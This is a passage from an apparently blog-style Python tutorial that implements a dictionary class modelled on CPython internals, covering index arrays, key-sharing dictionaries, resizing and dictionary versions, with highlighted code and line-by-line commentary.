&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; array&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;, [FREE]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n  &lt;span style=&#34;color:#75715e&#34;&gt;# signed char&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; array&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h&amp;#34;&lt;/span&gt;, [FREE]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n  &lt;span style=&#34;color:#75715e&#34;&gt;# signed short&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; array&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;l&amp;#34;&lt;/span&gt;, [FREE]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n  &lt;span style=&#34;color:#75715e&#34;&gt;# signed long&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [FREE] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The indices array is of a single type, therefore &lt;code&gt;DUMMY&lt;/code&gt; and &lt;code&gt;FREE&lt;/code&gt; should be of the same type.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;indices&lt;/code&gt; array will hold the sparse table of indices (pointing to the actual entries)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;used&lt;/code&gt; and &lt;code&gt;filled&lt;/code&gt; variables are used to hold the size of the dictionary with and without dummy values (respectively)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_make_index_array&lt;/code&gt; uses the &lt;a href=&#34;https://docs.python.org/3/library/array.html&#34;&gt;array&lt;/a&gt; module in order to compactly represent an array of basic values. It follows the &lt;a href=&#34;https://github.com/python/cpython/blob/eb8ac57af26c4eb96a8230eba7492ce5ceef7886/Objects/dictobject.c#L37&#34;&gt;logic of Python source code&lt;/a&gt; in order to determine the size of the indices.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			Compact dictionaries were implemented in Python 3.6.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h3 id=&#34;key-sharing-dictionaries&#34;&gt;Key Sharing Dictionaries&lt;/h3&gt;
&lt;p&gt;Python 3.3 &lt;a href=&#34;https://www.python.org/dev/peps/pep-0412/&#34;&gt;introduced&lt;/a&gt; key-sharing dictionaries. When dictionaries are created to fill the &lt;strong&gt;dict&lt;/strong&gt; slot of an object, they are created in split form. The keys table is cached in the type, potentially allowing all attribute dictionaries of instances of one class to share keys. This behaviour happens in the &lt;code&gt;__init__&lt;/code&gt; method of classes, and aims to save memory space and to improve speed of object creation. Your takeaway from this should be to always strive to assign attributes in the &lt;code&gt;__init_&lt;/code&gt; method so your custom classes can use key-sharing dictionaries.&lt;/p&gt;
&lt;p&gt;The following visual demonstrates three instances of the same class:&lt;/p&gt;

&lt;figure class=&#34;white-img-div&#34; &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/shared-keys.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;p&gt;You can see that each instance only holds its values, while there is a single, shared place in memory for the keys.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s implement this awesome feature in your dictionary:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DictKey&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;        __slots__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hashvalue&amp;#34;&lt;/span&gt;]  &lt;span style=&#34;color:#75715e&#34;&gt;# does not need a __dict__&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, key, hashvalue):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashvalue
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;DictKey {self.key}&amp;gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Dictionary&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_make_index_array(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# init with an 8 elements table&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys: List[DictKey] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values: List[Any] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# number of items in the dictionary&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filled &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# number of non-empty slots including dummy slots&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;update&lt;/span&gt;(self, other&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(), &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_sharing_keys &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; False
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(other, Dictionary):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25&lt;/span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; other:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26&lt;/span&gt;                        self[key] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; other[key]
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28&lt;/span&gt;                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_sharing_keys &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; True
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29&lt;/span&gt;                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; copy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copy(other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30&lt;/span&gt;                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31&lt;/span&gt;                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [None] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; len(other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32&lt;/span&gt;                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33&lt;/span&gt;                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filled &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filled
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;34&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; hasattr(other, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;35&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys():
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;36&lt;/span&gt;                    self[key] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; other[key]
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;37&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;38&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key, value &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; other:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;39&lt;/span&gt;                    self[key] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;40&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key, value &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; kwargs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;items():
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;41&lt;/span&gt;                self[key] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;42&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;43&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_check_keys_sharing&lt;/span&gt;(self):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;44&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;if trying to change dictionary with shared keys,
&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            migrate to non shared dictionary&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;46&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_sharing_keys:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;47&lt;/span&gt;                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; copy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copy(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 1&lt;/strong&gt; creates a &lt;code&gt;DictKey&lt;/code&gt; class which holds a key and its hash value&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Lines 15-16&lt;/strong&gt; sets two separate lists for entries: One for the keys, which may be shared with other instances, and one for the values.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 19&lt;/strong&gt;: The dictionary is planned to be initialized with values. The &lt;code&gt;update&lt;/code&gt; method takes care of that: No matter what type of argument received, as long as its an iterable, the dictionary will use its contents.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 22&lt;/strong&gt; sets &lt;code&gt;_sharing_keys&lt;/code&gt; to &lt;code&gt;False&lt;/code&gt; in order to mark whether this instance shares its keys with other instances.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Lines 23&lt;/strong&gt; checks if a &lt;code&gt;Dictionary&lt;/code&gt; arguments was given as argument, then it goes on to checking if the current dictionary is already filled with keys and values. If so, it copies the keys and values from the other dictionary.&lt;/p&gt;
&lt;p&gt;If the current dictionary is not filled, there&amp;rsquo;s the key sharing awesomeness! &lt;strong&gt;Line 28&lt;/strong&gt; copies the other dictionary &lt;code&gt;indices&lt;/code&gt; in order to preserve functionallity. &lt;code&gt;keys&lt;/code&gt; and &lt;code&gt;values&lt;/code&gt; must remain in sync, so &lt;code&gt;values&lt;/code&gt; needs to be initalized with &lt;code&gt;None&lt;/code&gt; values since you don&amp;rsquo;t want the values of the other dictionary. The other instance &lt;code&gt;keys&lt;/code&gt; is then only &lt;strong&gt;referenced&lt;/strong&gt; by &lt;code&gt;self.keys&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If the other instance is not of type &lt;code&gt;Dictionary&lt;/code&gt;, &lt;strong&gt;line 34&lt;/strong&gt; checks if it has a &lt;code&gt;keys&lt;/code&gt; attribute, like a real dictionary. If so, it copies its keys and values.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If all else fails, &lt;strong&gt;line 38&lt;/strong&gt; treats the other instance as if it had keys and values in it and copy them.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Finally, &lt;strong&gt;line 40&lt;/strong&gt; copies the keys and values given in &lt;code&gt;**kwargs&lt;/code&gt; as well.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_check_keys_sharing&lt;/code&gt; converts the dictionary to a non-shared dictionary. It is planned to be called when a shared dictionary tries to change its values.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dictionary-resize&#34;&gt;Dictionary Resize&lt;/h3&gt;
&lt;p&gt;Python checks for the table size everytime we add a key, and if the table is two-thirds full, it would resize the hash table. If a dictionary has 50000 keys or fewer, the new size is &lt;code&gt;used_size * 4&lt;/code&gt;, otherwise, it is &lt;code&gt;used_size * 2&lt;/code&gt;. Remember that Python stores the hash value along with the key and the value? This is where it comes in handy! Instead of rehashing the keys when inserting them to the new bigger table, the stored hashes are used. You might wonder - What if the key object was changed? In this case, the hash should be recalculated and the stored value will be incorrect? Such a situation is impossible, since mutable types cannot be keys of a dictionary. Here&amp;rsquo;s how you implement the resize operation:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Dictionary&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_resize&lt;/span&gt;(self, n: int):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;            n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; n&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bit_length()
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_make_index_array(n)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; entry_index, dict_key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_generate_probes(dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hashvalue, n &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; FREE:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; entry_index
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filled &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 3&lt;/strong&gt;: Python hash table sizes are powers of 2, so we will also use powers of 2. The primary reason Python uses &amp;ldquo;round&amp;rdquo; powers of 2 is efficiency: computing &lt;code&gt;% 2**n&lt;/code&gt; can be implemented using bit operations, as you&amp;rsquo;ve seen before.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 4&lt;/strong&gt; builds a new &lt;code&gt;indices&lt;/code&gt; array with the new bigger size.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Lines 5 - 9&lt;/strong&gt; loops through the keys. For every key, it generates an index. If that index is free in the new indices table, it inserts that key&amp;rsquo;s index into the indices table. Essentially, what this piece of code does is to allocate a new indices table and fill it up with the current keys. Notice no hashing is needed because the hashes are saved.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 10&lt;/strong&gt;: &lt;code&gt;filled&lt;/code&gt; should be equal to &lt;code&gt;used&lt;/code&gt; since nothing was deleted yet - there should not be any dummy values.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;private-dictionary-versions&#34;&gt;Private Dictionary Versions&lt;/h3&gt;
&lt;p&gt;Python 3.6 added a new private version to dictionaries, incremented at each dictionary creation and at each dictionary change. The rationale is to skip dictionary lookups if the version does not change, and to use cached values instead. Your implementation can implement a version for each instance, although it won&amp;rsquo;t implement the actual caching of values.&lt;/p&gt;
